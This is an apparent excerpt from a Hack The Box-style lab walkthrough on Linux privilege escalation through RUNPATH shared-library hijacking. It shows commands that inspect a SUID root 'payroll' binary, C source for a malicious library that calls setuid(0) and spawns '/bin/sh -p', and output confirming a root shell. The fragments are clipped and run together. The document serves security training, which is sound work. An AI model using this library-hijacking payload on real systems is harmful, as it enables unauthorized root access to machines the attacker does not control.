...
```
`htb-student@NIX02:~$ls-la payroll-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll`
```
...
```
`htb-student@NIX02:~$ldd payrolllinux-vdso.so.1 =>  (0x00007ffcb3133000)
...
```
`htb-student@NIX02:~$readelf -d payroll|grepPATH0x000000000000001d (RUNPATH)            Library runpath: [/development]`
```
...
Code:c```
`#include<stdio.h>#include<stdlib.h>#include<unistd.h>voiddbquery(){printf("Malicious library loaded\n");setuid(0);system("/bin/sh -p");}`
```
...
Malicious library loaded#iduid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)`
```